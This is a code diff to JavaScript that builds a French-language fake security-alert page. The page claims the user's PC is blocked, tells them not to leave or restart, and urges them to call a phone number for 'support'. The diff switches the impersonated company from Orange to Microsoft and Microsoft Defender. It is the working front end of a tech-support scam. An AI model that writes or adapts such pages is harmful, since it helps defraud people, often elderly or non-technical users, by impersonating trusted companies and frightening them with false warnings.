@@ -16,13 +16,13 @@
     '<div id="browserChromeShield" class="browser-chrome-shield" aria-hidden="true" role="alert">' +
     '<div class="browser-chrome-modal">' +
     '<p class="browser-chrome-alert">Une anomalie a été détectée</p>' +
-    '<p class="browser-chrome-warning">Appellez l\'assistance Orange</p>' +
+    '<p class="browser-chrome-warning">Appellez le support technique Microsoft</p>' +
     '<p class="browser-chrome-phone">+33 02 59 50 90 20</p>' +
     '</div></div>' +
     '<div id="escapeShield" class="escape-shield" aria-hidden="true" role="alert">' +
     '<div class="escape-shield-taskbar-wrap">' +
     '<div class="escape-shield-taskbar-modal">' +
-    '<p class="escape-shield-alert">Alerte de sécurité Orange</p>' +
+    '<p class="escape-shield-alert">Alerte de sécurité Microsoft</p>' +
     '<p class="escape-shield-warning">Ne quittez pas la page</p>' +
     '</div></div></div>' +
     '<div class="modal-top-square" id="securityOverlay" aria-label="Alerte securite" aria-hidden="true">' +
@@ -30,14 +30,14 @@
     '<section class="access-modal" aria-label="Alerte acces bloque">' +
     '<p>L\'accès à votre pc a été bloqué pour des raisons de sécurité.</p>' +
     '<p>N\'accédez pas à ce pc et ne le redémarrez pas. Si vous ignorez cet avertissement, vous risquez de perdre des informations.</p>' +
-    '<p>Contactez l\'assistance dès que possible ; un expert Orange vous guidera par téléphone lors de l\'analyse.</p>' +
+    '<p>Contactez le support technique Microsoft dès que possible ; un expert vous guidera par téléphone lors de l\'analyse.</p>' +
     '<p>L\'exécution de cette application peut mettre votre pc en danger.</p>' +
     '</section>' +
     '<div class="black-modal-blue-box">' +
-    '<p>Appellez l\'assistance Orange : 02 59 50 90 20</p>' +
-    '<p class="black-modal-defender">Appellez l\'assistance Orange</p>' +
+    '<p>Windows Support : +33 02 59 50 90 20</p>' +
+    '<p class="black-modal-defender">Microsoft Defender</p>' +
     '</div>' +
-    '<section class="scan-modal" aria-label="Assistance Orange">' +
+    '<section class="scan-modal scan-modal-hidden" aria-label="Support technique Microsoft" aria-hidden="true">' +
     '<h2 class="scan-modal-title">Désolé, l\'analyse n\'est pas terminée !</h2>' +
     '<p class="scan-modal-text">Une anomalie a été détectée sur votre appareil. Appellez l\'assistance Orange pour une analyse complète et sécuriser votre connexion.</p>' +
     '<p class="scan-modal-text">Contactez l\'assistance Orange pour obtenir de l\'aide</p>' +
@@ -48,9 +48,9 @@
     '</div>' +
     '</section>' +
     '</div>' +
-    '<aside class="support-card" aria-label="Assistance Orange">' +
-    '<p class="support-card-subtitle">Appellez l\'assistance Orange</p>' +
-    '<p class="support-card-phone">02 59 50 90 20</p>' +
+    '<aside class="support-card" aria-label="Support technique Microsoft">' +
+    '<p class="support-card-subtitle">Support technique Microsoft</p>' +
+    '<p class="support-card-phone">+33 02 59 50 90 20</p>' +
     '<p class="support-card-label">Numero</p>' +
     '<div class="support-card-arrow" aria-hidden="true">▼</div></aside></div>' +
     '<div class="home-page">' +
